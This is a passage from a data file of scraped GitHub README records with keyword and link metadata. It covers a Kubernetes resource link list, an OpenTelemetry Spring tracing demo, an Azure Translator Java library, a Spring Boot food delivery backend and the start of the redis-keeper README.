curated list for Awesome Kubernetes Security resources -> https://github.com/magnologan/awesome-k8s-security', 'Kubernetes Security Checklist and Requirements -> https://github.com/Vinum-Security/kubernetes-security-checklist', 'Kubernetes Hardening Manual -> https://github.com/seifrajhi/kubernetes-hardening-checklist-guidance', 'PVs, PVCs, and StorageClass -> https://medium.com/@seifeddinerajhi/understanding-storage-in-kubernetes-ee2c19001aae', 'Kubernetes the Hard Way -> https://github.com/kelseyhightower/kubernetes-the-hard-way', 'Learnk8s -> https://learnk8s.io/', 'Introduction to Kubernetes Lecture Notes -> https://github.com/kaan-keskin/introduction-to-kubernetes/tree/main', 'Kubernetes Handbook -> https://github.com/rootsongjc/kubernetes-handbook', 'Kubeapps -> https://github.com/vmware-tanzu/kubeapps', 'Start learning Kubernetes today -> https://kubebyexample.com/', 'Step by step guide to learning Kubernetes -> https://roadmap.sh/kubernetes', 'Kubernetes the Harder Way -> https://github.com/ghik/kubernetes-the-harder-way', 'Kubernetes mind map -> https://betterprogramming.pub/6-important-things-you-need-to-run-kubernetes-in-production-d573d61258c5', 'Awesome Kubernetes Resources -> https://github.com/tomhuang12/awesome-k8s-resources', 'Kubernetes in Action book by Marko Lukša -> https://www.amazon.com/-/en/Marko-Luksa/dp/1617293725', 'Kubernetes Tips: Using a ServiceAccount -> https://medium.com/better-programming/k8s-tips-using-a-serviceaccount-801c433d0023', 'Simplify Kubernetes day 2 ops with Palette Cluster Profiles -> https://www.spectrocloud.com/blog/kubernetes-day-2-operations-with-cluster-profiles', 'Provides our opinionated point of view on how GitOps can be used to manage the infrastructure, services and application layers of K8s based systems -> https://github.com/cloud-native-toolkit/multi-tenancy-gitops', 'COMMON KUBERNETES ERRORS AND HOW THEY IMPACT CLOUD DEPLOYMENTS -> https://cloudtweaks.com/2023/01/common-kubernetes-errors/', 'Exit Codes In Containers & Kubernetes – The Complete Guide -> https://komodor.com/learn/exit-codes-in-containers-and-kubernetes-the-complete-guide/', 'How to identify and troubleshoot common Kubernetes errors -> https://newrelic.com/blog/how-to-relic/monitoring-kubernetes-part-three', 'Kubernetes Troubleshooting: 5 Common Errors & How to Fix Them -> https://lumigo.io/kubernetes-troubleshooting/', 'Kubernetes Troubleshooting – The Complete Guide -> https://komodor.com/learn/kubernetes-troubleshooting-the-complete-guide/', 'A visual guide on troubleshooting Kubernetes deployments -> https://learnk8s.io/troubleshooting-deployments', 'Kubernetes Troubleshooting: Effective Strategies for Unraveling the Puzzle -> https://www.groundcover.com/kubernetes-troubleshooting', 'node-problem-detector -> https://github.com/kubernetes/node-problem-detector', 'Kubernetes Goat -> https://github.com/madhuakula/kubernetes-goat', 'Terraform module to create AWS Elastic Kubernetes (EKS) resources -> https://github.com/terraform-aws-modules/terraform-aws-eks', 'This project -> https://github.com/aws-ia/terraform-aws-eks-blueprints', 'EKS Workshop -> https://www.eksworkshop.com/', ' (Amazon EKS) Best Practices -> https://aws.github.io/aws-eks-best-practices/', 'AWS EKS Kubernetes - Masterclass | DevOps, Microservices -> https://github.com/stacksimplify/aws-eks-kubernetes-masterclass', 'Azure AKS Kubernetes Masterclass -> https://github.com/stacksimplify/azure-aks-kubernetes-masterclass', 'Official repository for the AKS Landing Zone Accelerator program -> https://github.com/Azure/AKS-Landing-Zone-Accelerator', 'Azure Kubernetes Service Checklist -> https://www.the-aks-checklist.com/', 'Configures opinionated GKE clusters in terraform -> https://github.com/terraform-google-modules/terraform-google-kubernetes-engine', 'Sample applications for Google Kubernetes Engine (GKE) -> https://github.com/GoogleCloudPlatform/kubernetes-engine-samples', 'Elastic Cloud on Kubernetes -> https://github.com/elastic/cloud-on-k8s', 'Kubernetes Playground -> https://github.com/netgroup/kubernetes-playground', 'Gluster file system with Kubernetes -> https://github.com/bwolf/gluster-k8s-playground', 'A standalone Kubernetes cluster -> https://github.com/nextbreakpoint/kubernetes-playground', 'Playground -> https://labs.play-with-k8s.com/', 'Kubernetes CKS Full Course -> https://www.youtube.com/watch?v=d9xfB5qaOfg', 'Kubernetes CKS Course Environment -> https://github.com/killer-sh/cks-course-environment', 'Certified Kubernetes Security Specialist - CKS -> https://github.com/walidshaari/Certified-Kubernetes-Security-Specialist', 'Kubernetes Certified Administration -> https://github.com/walidshaari/Kubernetes-Certified-Administrator', 'CKA preparation -> https://github.com/alijahnas/CKA-practice-exercises', 'CKA Exercises -> https://github.com/chadmcrowell/CKA-Exercises', 'Helm GitHub Repository -> https://github.com/helm/helm', 'Kustomize GitHub Repository -> https://github.com/kubernetes-sigs/kustomize', 'kubectx GitHub Repository -> https://github.com/ahmetb/kubectx', 'Kubeval GitHub Repository -> https://github.com/instrumenta/kubeval', 'Kops GitHub Repository -> https://github.com/kubernetes/kops', 'Terraform -> https://www.terraform.io/', 'Pulumi GitHub Repository -> https://github.com/pulumi/pulumi', 'Kubeform GitHub Repository -> https://github.com/helmfile/helmfile', 'Jsonnet GitHub Repository -> https://github.com/google/jsonnet', 'Skaffold GitHub Repository -> https://github.com/GoogleContainerTools/skaffold']",70
DGuhr/spring-otel-extended,main,"# spring-otel-extended - Extending Springs instrumentation
This repository provides multiple approaches to (auto)-instrument Spring and Spring Boot using the OpenTelemetry java agent and -Instrumentation.

This is a Work in Progress for now. For current TODOs, see [TODOS](#todo) 
## Use Case
At the time of writing this, when you use the OpenTelemetry Java Agent to auto-instrument a Spring-Application, your traces look like in the following picture:
![pic](assets/currentstate.png)

This is a fine Trace, but there might be something missing in the ""in between"", and especially for bigger (often: over-abstracted / over-architected legacy) apps, such a trace can be very hard to read, because it usually consists of way more database calls, so you have one /GET call and then, say, 10s of DB calls, and then another POST call to a downstream service... and so on.

The idea here is to show the intermediate, Spring-annotated steps like in the following picture:

![pic](assets/targetstate.png)

This is actually the same operation that was done in the first picture, but now we see the chain of callers, so it is possible to really understand what part of your app did the database calls.

I know that this leads to the generation of many spans and is therefore not added to the official auto-instrumentation, see [the otel issue](https://github.com/open-telemetry/opentelemetry-java-instrumentation/issues/2574). So, it might not be suitable in production telemetry, but it certainly helped me a lot to understand the inner workings of unknown/legacy spring and spring boot codebases, where those traces consist of 30+ spans, lots of them looking like random database queries. 

Alternatively, one could surely use tools like the great [Grafana Pyroscope](https://github.com/grafana/pyroscope) continuous profiling tool to achieve the same, but the solutions shown in this repository feel more lightweight to me, as I simply do not need to spin up and maintain another component and integrate another agent to achieve a more high-resolution look into the application.

## Overview

This repository consists of 5 services:
1) `official-auto-otel-animal-app`: A Spring Boot-Application with an example structure using `@Component`,`@Service` and `@Repository`.
2) `aspect-based-otel-animal-app`: The same App as 1), but using Springs AOP to add Spans to all public methods for the intermediate Layers.
3) `otel-javaagent-spring-extension`: An OpenTelemetry Java-Agent [Extension](https://opentelemetry.io/docs/languages/java/automatic/extensions/) that extends the official agent capabilities to record the intermediate spans.
4) `extension-based-otel-animal-app`: An app that uses the Java agent extension from 3) to provide the same functionality as the aspect solution, without ""touching the code"".
5) `legacy-tomcat-spring-app`: (More or less) the same applictaion, but running on a legacy spring 5 stack (plain, without spring boot) on tomcat 9 and jdk11. It also uses the custom java agent extension.

## Observability stack in docker 
The Observability-Stack consists of: 
* The apps, packaged as containers
* An OpenTelemetry Collector where the signals are sent to
* Prometheus for metrics 
* Tempo for Traces
* Grafana for visualization

It is built using containers and compose for the sake of simplicity. It is tested using docker. I am happy to hear if it also works for podman and other container solutions.

## Running the stack

First, build the respective modules using e.g. `mvn clean package` in each of the modules (see [TODO](#todo))

**Note**: If you want to build the javaagent extension for use with the legacy app, you have to change the maven properties `<maven.compiler.source>` and `<maven.compiler.target>` to use 11 instead of 21. Without changing this, the extension does not get picked up by the classloader.

You can start the stack simply by running `docker compose up --build -d` from the root directory of this repository. I added the pre-built `otel-javaagent-spring-extension-jdk11-1.0-SNAPSHOT.jar` for convenience reasons directly to the `legacy-tomcat-spring-app/agent` directory in this repository.

The following endpoints are available when the stack is started:
* `official-auto-otel-animal-app`: Call [http://localhost:8081/animals](http://localhost:8081/animals) 
* `aspect-based-otel-animal-app`: Call [http://localhost:8082/animals](http://localhost:8082/animals)
* `extension-based-otel-animal-app`: Call [http://localhost:8083/animals](http://localhost:8083/animals)
* `legacy-tomcat-spring-app`: Call [http://localhost:8084/animals](http://localhost:8083/animals)
* `Grafana`: Call `http://localhost:3001` to access the dashboard. Prometheus and Tempo data sources are already added. Username and Password: `admin // pass`

To stop the stack, call `docker compose down`. 

If you want to delete the existing data, use `docker compose down -v` to delete the named volumes.

## TODO
- use gradle / maven multi-module to make building the apps more convenient (contribution welcome)


# DONE
- Get the custom java agent extension for complemental spring spans to work. 🥳
- Add Spring legacy example with agent extension 🎊
",0,1,1,mit,1.0,"['extending', 'spring', 'instrumentation', 'repository', 'provides', 'multiple', 'approach', 'auto', 'spring', 'spring', 'boot', 'using', 'opentelemetry', 'java', 'agent', 'work', 'progress', 'current', 'todos', 'see', 'todos', 'use', 'case', 'time', 'writing', 'use', 'opentelemetry', 'java', 'agent', 'trace', 'look', 'like', 'following', 'picture', 'fine', 'trace', 'might', 'something', 'missing', 'especially', 'bigger', 'often', 'legacy', 'apps', 'trace', 'hard', 'read', 'usually', 'consists', 'way', 'database', 'call', 'one', 'call', 'say', 'db', 'call', 'another', 'post', 'call', 'downstream', 'service', 'idea', 'show', 'intermediate', 'step', 'like', 'following', 'picture', 'actually', 'operation', 'done', 'first', 'picture', 'see', 'chain', 'caller', 'possible', 'really', 'understand', 'part', 'app', 'database', 'call', 'know', 'lead', 'generation', 'many', 'span', 'therefore', 'added', 'official', 'see', 'otel', 'issue', 'might', 'suitable', 'production', 'telemetry', 'certainly', 'helped', 'lot', 'understand', 'inner', 'working', 'spring', 'spring', 'boot', 'codebases', 'trace', 'consist', 'span', 'lot', 'looking', 'like', 'random', 'database', 'query', 'alternatively', 'one', 'could', 'surely', 'use', 'tool', 'like', 'great', 'grafana', 'pyroscope', 'continuous', 'profiling', 'tool', 'achieve', 'solution', 'shown', 'repository', 'feel', 'lightweight', 'simply', 'need', 'spin', 'maintain', 'another', 'component', 'integrate', 'another', 'agent', 'achieve', 'look', 'application', 'overview', 'repository', 'consists', 'service', 'spring', 'example', 'structure', 'using', 'app', 'using', 'spring', 'aop', 'add', 'span', 'public', 'method', 'intermediate', 'layer', 'opentelemetry', 'extension', 'extends', 'official', 'agent', 'capability', 'record', 'intermediate', 'span', 'app', 'us', 'java', 'agent', 'extension', 'provide', 'functionality', 'aspect', 'solution', 'without', 'touching', 'code', 'less', 'applictaion', 'running', 'legacy', 'spring', 'stack', 'plain', 'without', 'spring', 'boot', 'tomcat', 'also', 'us', 'custom', 'java', 'agent', 'extension', 'observability', 'stack', 'docker', 'consists', 'apps', 'packaged', 'container', 'opentelemetry', 'collector', 'signal', 'sent', 'prometheus', 'metric', 'tempo', 'trace', 'grafana', 'visualization', 'built', 'using', 'container', 'compose', 'sake', 'simplicity', 'tested', 'using', 'docker', 'happy', 'hear', 'also', 'work', 'podman', 'container', 'solution', 'running', 'stack', 'first', 'build', 'respective', 'module', 'using', 'module', 'see', 'todo', 'note', 'want', 'build', 'javaagent', 'extension', 'use', 'legacy', 'app', 'change', 'maven', 'property', 'use', 'instead', 'without', 'changing', 'extension', 'get', 'picked', 'classloader', 'start', 'stack', 'simply', 'running', 'root', 'directory', 'repository', 'added', 'convenience', 'reason', 'directly', 'directory', 'repository', 'following', 'endpoint', 'available', 'stack', 'started', 'call', 'http', 'call', 'http', 'call', 'http', 'call', 'http', 'call', 'access', 'dashboard', 'prometheus', 'tempo', 'data', 'source', 'already', 'added', 'username', 'password', 'stop', 'stack', 'call', 'want', 'delete', 'existing', 'data', 'use', 'delete', 'named', 'volume', 'todo', 'use', 'gradle', 'maven', 'make', 'building', 'apps', 'convenient', 'contribution', 'welcome', 'done', 'get', 'custom', 'java', 'agent', 'extension', 'complemental', 'spring', 'span', 'work', 'add', 'spring', 'legacy', 'example', 'agent', 'extension']","['spring', 'call', 'agent', 'use', 'extension']",2,0,0,"['extending', 'spring', 'instrumentation', 'use', 'case', 'overview', 'observability', 'stack', 'docker', 'run', 'stack', 'todo', 'done']",7,"['stack', 'extending', 'spring', 'instrumentation', 'use']",0,0.0,5.0,"[org.apache.maven.plugins:maven-war-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,0.0,5173,28.13793103448276,4.954656862745098,"['the otel issue -> https://github.com/open-telemetry/opentelemetry-java-instrumentation/issues/2574', 'Grafana Pyroscope -> https://github.com/grafana/pyroscope', 'Extension -> https://opentelemetry.io/docs/languages/java/automatic/extensions/', 'http://localhost:8081/animals -> http://localhost:8081/animals', 'http://localhost:8082/animals -> http://localhost:8082/animals', 'http://localhost:8083/animals -> http://localhost:8083/animals', 'http://localhost:8084/animals -> http://localhost:8083/animals']",7
brenoepics/at4j,main,"# Azure Translator for Java (AT4J)

[![Maven Central](https://img.shields.io/maven-central/v/io.github.brenoepics/at4j?color=blue)](https://central.sonatype.com/artifact/io.github.brenoepics/at4j)
![Static Badge](https://img.shields.io/badge/azure--api-3.0-blue?style=flat&logo=microsoftazure&logoColor=%230080FF&color=%230080FF&link=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fazure%2Fai-services%2Ftranslator%2Freference%2Fv3-0-reference)
[![Static Badge](https://img.shields.io/badge/run-l?logo=postman&label=Postman&color=EF5B25)](https://www.postman.com/maintenance-astronaut-2993290/workspace/brenoepics/collection/18589822-dfe7a640-9b94-47a8-b19f-46cb9cc8843e?action=share&creator=18589822)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=coverage)](https://sonarcloud.io/summary/new_code?id=brenoepics_at4j)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=brenoepics_at4j)

An unofficial Java library for translating text using Azure AI Cognitive Services.

## ✨ Features

- Text Translation: Translate text from one language (or detect) to another or to a list of languages.
- Language Detection: Detect the language of a given text.
- Profanity Handling: Options for handling profanity in translations.
- Text Type Support: We support both plain text and HTML text translation.
- And more.

## 📝 Documentation

- [AT4J Docs](https://brenoepics.github.io/at4j/)
- [JavaDoc](https://brenoepics.github.io/at4j/javadoc/)

## 🎉 Basic Usage

> [!NOTE]
> Example repository [Azure-Translator-Example](https://github.com/brenoepics/Azure-Translator-Example)

The following example translates a simple Hello World to Portuguese, Spanish and French.

```java
public class ExampleTranslator {
  public static void main(String[] args) {
    // Insert your Azure key and region here
    String azureKey = ""<Your Azure Subscription Key>"";
    String azureRegion = ""<Your Azure Subscription Region>"";
    AzureApi api = new AzureApiBuilder().setKey(azureKey).region(azureRegion).build();

    // Set up translation parameters
    List < String > targetLanguages = List.of(""pt"", ""es"", ""fr"");
    TranslateParams params =
            new TranslateParams(""Hello World!"", targetLanguages).setSourceLanguage(""en"");

    // Translate the text
    Optional < TranslationResponse > translationResult = api.translate(params).join();

    // Print the translations
    translationResult.ifPresent(
            response ->
                    response.getFirstResult().getTranslations().forEach(ExampleTranslator::logLanguage));
  }

  public static void logLanguage(Translation translation) {
    System.out.println(translation.getLanguageCode() + "": "" + translation.getText());
  }
}
```

<details>
     <summary>Expected Output</summary>

```console
pt: Olá, Mundo!
es: ¡Hola mundo!
fr: Salut tout le monde!
```

</details>

## 📦 Download / Installation

The recommended way to get AT4J is to use a build manager, like Gradle or Maven.

### [AT4J Dependency](https://central.sonatype.com/artifact/io.github.brenoepics/at4j)

<details>
  <summary>Gradle</summary>

```gradle
implementation group: 'io.github.brenoepics', name: 'at4j', version: '1.2.0'
```

</details>
<details>
  <summary>Maven</summary>

```xml

<dependency>
    <groupId>io.github.brenoepics</groupId>
    <artifactId>at4j</artifactId>
    <version>1.2.0</version>
</dependency>
```

</details>
<details>
  <summary>Sbt</summary>

```sbt
libraryDependencies += ""io.github.brenoepics"" % ""at4j"" % ""1.2.0""
```

</details>

### Frequently Asked Questions (FAQ)

**Q:** How do I access Azure Translator Keys for my project?

**A:** You can access your Azure Translator Keys through your Azure portal. Remember to keep your keys secure and
refrain from sharing them publicly. If you suspect a key has been compromised, it's crucial to regenerate it promptly.
For detailed instructions on generating your own keys, refer
to [this guide](https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-subscription). Additionally, you
can explore the [Azure Free Tier](https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-free-tier) for
more information.

## 🤝 Thank You!

- **Microsoft Azure**: Supporting our project with a generous grant of $10,000+ in Azure credits, enabling us to use
  virtual machines, document translation and other essential cloud resources for our development needs.
- We extend our sincere thanks to all contributors for their invaluable contributions.

## 🧑‍💻 Contributing

Contributions of any kind are welcome. You can start contributing to this library by creating issues, submitting pull
requests or giving a star to the project.

## 📃 License

AT4J is distributed under the [Apache license version 2.0](./LICENSE).
",4,2,8,apache-2.0,48.0,"['azure', 'translator', 'java', 'unofficial', 'java', 'library', 'translating', 'text', 'using', 'azure', 'ai', 'cognitive', 'service', 'feature', 'text', 'translation', 'translate', 'text', 'one', 'language', 'detect', 'another', 'list', 'language', 'language', 'detection', 'detect', 'language', 'given', 'text', 'profanity', 'handling', 'option', 'handling', 'profanity', 'translation', 'text', 'type', 'support', 'support', 'plain', 'text', 'html', 'text', 'translation', 'documentation', 'doc', 'javadoc', 'basic', 'usage', 'note', 'example', 'repository', 'following', 'example', 'translates', 'simple', 'hello', 'world', 'portuguese', 'spanish', 'french', 'download', 'installation', 'recommended', 'way', 'get', 'use', 'build', 'manager', 'like', 'gradle', 'maven', 'dependency', 'frequently', 'asked', 'question', 'faq', 'q', 'access', 'azure', 'translator', 'key', 'project', 'access', 'azure', 'translator', 'key', 'azure', 'portal', 'remember', 'keep', 'key', 'secure', 'refrain', 'sharing', 'publicly', 'suspect', 'key', 'compromised', 'crucial', 'regenerate', 'promptly', 'detailed', 'instruction', 'generating', 'key', 'refer', 'guide', 'additionally', 'explore', 'azure', 'free', 'tier', 'information', 'thank', 'microsoft', 'azure', 'supporting', 'project', 'generous', 'grant', 'azure', 'credit', 'enabling', 'u', 'use', 'virtual', 'machine', 'document', 'translation', 'essential', 'cloud', 'resource', 'development', 'need', 'extend', 'sincere', 'thanks', 'contributor', 'invaluable', 'contribution', 'contributing', 'contribution', 'kind', 'welcome', 'start', 'contributing', 'library', 'creating', 'issue', 'submitting', 'pull', 'request', 'giving', 'star', 'project', 'license', 'distributed', 'apache', 'license', 'version']","['azure', 'text', 'key', 'translation', 'language']",6,0,0,"['azure', 'translator', 'java', 'feature', 'documentation', 'basic', 'usage', 'download', 'installation', 'dependency', 'http', 'frequently', 'ask', 'question', 'faq', 'thank', 'you', 'contribute', 'license']",10,"['azure', 'translator', 'java', 'feature', 'documentation']",5,136.0,1.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,4877,21.41379310344828,5.872785829307569,"['![Maven Central -> https://img.shields.io/maven-central/v/io.github.brenoepics/at4j?color=blue', 'Static Badge -> https://img.shields.io/badge/azure--api-3.0-blue?style=flat&logo=microsoftazure&logoColor=%230080FF&color=%230080FF&link=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fazure%2Fai-services%2Ftranslator%2Freference%2Fv3-0-reference', '![Static Badge -> https://img.shields.io/badge/run-l?logo=postman&label=Postman&color=EF5B25', '![Coverage -> https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=coverage', '![Quality Gate Status -> https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=alert_status', 'AT4J Docs -> https://brenoepics.github.io/at4j/', 'JavaDoc -> https://brenoepics.github.io/at4j/javadoc/', 'Azure-Translator-Example -> https://github.com/brenoepics/Azure-Translator-Example', 'AT4J Dependency -> https://central.sonatype.com/artifact/io.github.brenoepics/at4j', 'this guide -> https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-subscription', 'Azure Free Tier -> https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-free-tier']",11
Missuo0o/FoodDeliveryBackend,main,"# Food Delivery Backend System

This is the backend system for a food delivery application, built using Spring Boot. The application leverages a range of technologies including MySQL, Redis, RabbitMQ, and integrates with Alibaba Cloud's OSS and WeChat Pay. This system is designed to be scalable, secure, and efficient, utilizing Spring Boot's extensive support for enterprise-grade applications.

## Configuration

The application is configured to run on port 8080 and is set up with production profiles. It uses MyBatis for ORM, JWT for authentication, and includes advanced logging configurations.

### Technologies Used

- **Spring Boot** - Framework for building Java-based applications.
- **MySQL** - Database for storing user and order data.
- **Redis** - Used as a cache and session store.
- **RabbitMQ** - Messaging broker for handling asynchronous processing.
- **JWT** - For securing REST APIs by providing tokens to verify user identity.
- **MyBatis** - Persistence framework integrating with Spring Boot for data handling.
- **Knife4j** - Enhanced Swagger-compatible interface for visualizing RESTful APIs.
- **Alibaba Cloud OSS** - For storage solutions.
- **WeChat Pay** - Payment integration for handling transactions and refunds.

## Installation

### Prerequisites

You need the following installed on your system:

- Java JDK 23
- Maven
- MySQL
- RabbitMQ
- Redis

### Setup

1. Clone the repository:

   ```bash
   git clone https://github.com/yourusername/food-delivery-backend.git
   ```

2. Navigate to the project directory:

   ```bash
   cd food-delivery-backend
   ```

3. Install dependencies:

   ```bash
   mvn install
   ```

### Configuration

Update the `application.yml` or `application.properties` with your specific settings for MySQL, Redis, RabbitMQ, OSS, and WeChat Pay. This typically includes hosts, ports, usernames, passwords, and other essential configuration details.

Certainly! Here's the section of the README updated to reflect how to run the application using the `java -jar` command instead of Maven directly:

---

## Running the Application

Instead of using Maven to run the application, you can build a jar file and run it directly using the Java command. This is often more suitable for production environments or when deploying the application.

1. First, package the application into a runnable jar file with Maven:

   ```bash
   mvn clean package
   ```

   This command will create a `.jar` file in the `target` directory.

2. Run the application using:

   ```bash
   java -jar target/your-application-name.jar
   ```

   Replace `your-application-name.jar` with the actual name of your jar file generated by Maven.

The application will start running on `http://localhost:8080`.

---

## API Documentation

API documentation is available via Swagger UI and Knife4j at:

- **Swagger UI**: [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
- **Knife4j**: [http://localhost:8080/doc.html](http://localhost:8080/doc.html)

## Security

This application uses JWT for authentication. Ensure you configure your JWT settings properly, including secret keys and token names for both admin and user levels.

## Contributing

We appreciate contributions. Please follow the standard GitHub fork-and-pull-request workflow.

## License

This project is licensed under the MIT License - see the LICENSE.md file for details.

---

This README includes detailed instructions for setting up and running your application, along with configuration management practices, to ensure smooth deployment and operation. Adjustments may be necessary to fit your exact setup or additional features.



",0,0,1,mit,0.0,"['food', 'delivery', 'backend', 'system', 'backend', 'system', 'food', 'delivery', 'application', 'built', 'using', 'spring', 'boot', 'application', 'leverage', 'range', 'technology', 'including', 'mysql', 'redis', 'rabbitmq', 'integrates', 'alibaba', 'cloud', 'os', 'wechat', 'pay', 'system', 'designed', 'scalable', 'secure', 'efficient', 'utilizing', 'spring', 'boot', 'extensive', 'support', 'application', 'configuration', 'application', 'configured', 'run', 'port', 'set', 'production', 'profile', 'us', 'mybatis', 'orm', 'jwt', 'authentication', 'includes', 'advanced', 'logging', 'configuration', 'technology', 'used', 'spring', 'boot', 'framework', 'building', 'application', 'mysql', 'database', 'storing', 'user', 'order', 'data', 'redis', 'used', 'cache', 'session', 'store', 'rabbitmq', 'messaging', 'broker', 'handling', 'asynchronous', 'processing', 'jwt', 'securing', 'rest', 'apis', 'providing', 'token', 'verify', 'user', 'identity', 'mybatis', 'persistence', 'framework', 'integrating', 'spring', 'boot', 'data', 'handling', 'enhanced', 'interface', 'visualizing', 'restful', 'apis', 'alibaba', 'cloud', 'os', 'storage', 'solution', 'wechat', 'pay', 'payment', 'integration', 'handling', 'transaction', 'refund', 'installation', 'prerequisite', 'need', 'following', 'installed', 'system', 'java', 'jdk', 'maven', 'mysql', 'rabbitmq', 'redis', 'setup', 'clone', 'repository', 'navigate', 'project', 'directory', 'install', 'dependency', 'configuration', 'update', 'specific', 'setting', 'mysql', 'redis', 'rabbitmq', 'os', 'wechat', 'pay', 'typically', 'includes', 'host', 'port', 'usernames', 'password', 'essential', 'configuration', 'detail', 'certainly', 'section', 'readme', 'updated', 'reflect', 'run', 'application', 'using', 'command', 'instead', 'maven', 'directly', 'running', 'application', 'instead', 'using', 'maven', 'run', 'application', 'build', 'jar', 'file', 'run', 'directly', 'using', 'java', 'command', 'often', 'suitable', 'production', 'environment', 'deploying', 'application', 'first', 'package', 'application', 'runnable', 'jar', 'file', 'maven', 'command', 'create', 'file', 'directory', 'run', 'application', 'using', 'replace', 'actual', 'name', 'jar', 'file', 'generated', 'maven', 'application', 'start', 'running', 'api', 'documentation', 'api', 'documentation', 'available', 'via', 'swagger', 'ui', 'swagger', 'ui', 'http', 'http', 'security', 'application', 'us', 'jwt', 'authentication', 'ensure', 'configure', 'jwt', 'setting', 'properly', 'including', 'secret', 'key', 'token', 'name', 'admin', 'user', 'level', 'contributing', 'appreciate', 'contribution', 'please', 'follow', 'standard', 'github', 'workflow', 'license', 'project', 'licensed', 'mit', 'license', 'see', 'file', 'detail', 'readme', 'includes', 'detailed', 'instruction', 'setting', 'running', 'application', 'along', 'configuration', 'management', 'practice', 'ensure', 'smooth', 'deployment', 'operation', 'adjustment', 'may', 'necessary', 'fit', 'exact', 'setup', 'additional', 'feature']","['application', 'using', 'configuration', 'run', 'maven']",0,0,0,"['food', 'delivery', 'backend', 'system', 'configuration', 'technology', 'use', 'installation', 'prerequisite', 'setup', 'configuration', 'run', 'application', 'api', 'documentation', 'security', 'contribute', 'license']",12,"['configuration', 'food', 'delivery', 'backend', 'system']",5,0.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,3665,14.882352941176473,5.496047430830039,"['http://localhost:8080/swagger-ui.html -> http://localhost:8080/swagger-ui.html', 'http://localhost:8080/doc.html -> http://localhost:8080/doc.html']",2
codebaorg/redis-keeper,main,"<h4 align=""right""><strong>English</strong> | <a href=""./README_zh.md"">简体中文</a></h4>

# Redis keeper - Lightweight Redis Multi-datasource Management Tool
[![Maven Central](https://maven-badges.herokuapp.com/maven-central/org.redisson/redisson/badge.svg)](https://central.sonatype.com/artifact/org.codeba/redis-keeper)
[![License](http://img.shields.io/:license-apache-brightgreen.svg)](http://www.apache.org/licenses/LICENSE-2.0.html)


**Supported JDK: 1.8 ... 21**

**Supported Redisson: 3.15.5 ... 3.35.0**

**Supported Redis: 3.0 ... 7.2**

## Features

* Based on redisson package, retain all the powerful features of redisson
* Support for multiple data source configuration and real-time updates for redis
* Support ""read-only"", ""write-only"", ""read-write"" and ""skip"" state switching for redis data sources
* Excellent expandability and compatibility to meet all your needs


## Quick start

#### Maven
    <dependency>
       <groupId>org.codeba</groupId>
       <artifactId>redis-keeper-core</artifactId>
       <version>2024.2.0</version>
    </dependency> 

    <dependency>
       <groupId>org.codeba</groupId>
       <artifactId>redis-keeper-support</artifactId>
       <version>2024.2.0</version>
    </dependency> 

#### Gradle

    implementation group: 'org.codeba', name: 'redis-keeper-core', version: '2024.2.0'

    implementation group: 'org.codeba', name: 'redis-keeper-support', version: '2024.2.0'

#### Sbt

    libraryDependencies += ""org.codeba"" % ""redis-keeper-core"" % ""2024.2.0""
    
    libraryDependencies += ""org.codeba"" % ""redis-keeper-support"" % ""2024.2.0""


#### Java

```java
// 1. Create config object
Config config = new Config();
config.useSingleServer().setAddress(""redis://localhost:6379"").setPassword(yourPass);
```

```java
// 2. Create datasource
DefaultCacheDatasource datasource = new DefaultCacheDatasource();

Map<String, CacheTemplate> dsMap = datasource.initialize(new HashMap<String, CacheKeeperConfig>() {{
    put(""ds1"", new CacheKeeperConfig(config));
}});

Map<String, List<CacheTemplate>> dssMap = datasource.initializeMulti(new HashMap<String, List<CacheKeeperConfig>>() {{
    put(""ds2"", Collections.singletonList(new CacheKeeperConfig(config)));
}});
```

```java
// 3. Create datasource provider
CacheTemplateProvider<CacheTemplate> provider = new CacheTemplateProvider<>(dsMap, dssMap);
```

```java
// 4. Get redis template
Optional<CacheTemplate> templateOptional = provider.getTemplate(""ds1"");
final CacheTemplate cacheTemplate = templateOptional.get();
cacheTemplate.set(""foo"", ""bar"");

// or get the read and write state of the cacheTemplate
Optional<CacheTemplate> templateOptionalRW = provider.getTemplate(""ds1"", CacheDatasourceStatus.RW);

// or get multiple cacheTemplates
Collection<CacheTemplate> cacheTemplates = provider.getTemplates(""ds2"");

// or load balanced polling to get cacheTemplate from multiple data sources
Optional<CacheTemplate> polledTemplate = provider.pollTemplate(""ds2"");

// or randomize cacheTemplate from multiple data sources
Optional<CacheTemplate> randomedTemplate = provider.randomTemplate(""ds2"");
```

## Springboot

1. Maven

```java
<dependency>
	<groupId>org.codeba</groupId>
	<artifactId>redis-keeper-spring-boot-starter</artifactId>
	<version>2024.2.0</version>
</dependency>
```

2. Example datasource configuration as follows：

```yaml
redis-keeper:
  redis:
    datasource:
      ds1:
        host: localhost
        port: 6379
        password: yourPass
        invoke-params-print: true

    datasources:
      ds2:
        - host: localhost
          port: 6379
          database: 1
          password: yourPass
          invoke-params-print: true

        - host: localhost
          port: 6379
          database: 2
          password: yourPass
          invoke-params-print: true

```

3. Examples of common methods：

```java
@SpringBootTest
public class AppTest {

    @Autowired
    private CacheTemplateProvider<CacheTemplate> provider;

    @Test
    public void test() {
        String key = ""foo"";
        String value = ""bar"";

        final CacheTemplate cacheTemplate = provider.getTemplate(""ds1"").get();
        // set
        cacheTemplate.set(key, value);
        cacheTemplate.setObject(key, value);
        // get
        cacheTemplate.get(key);
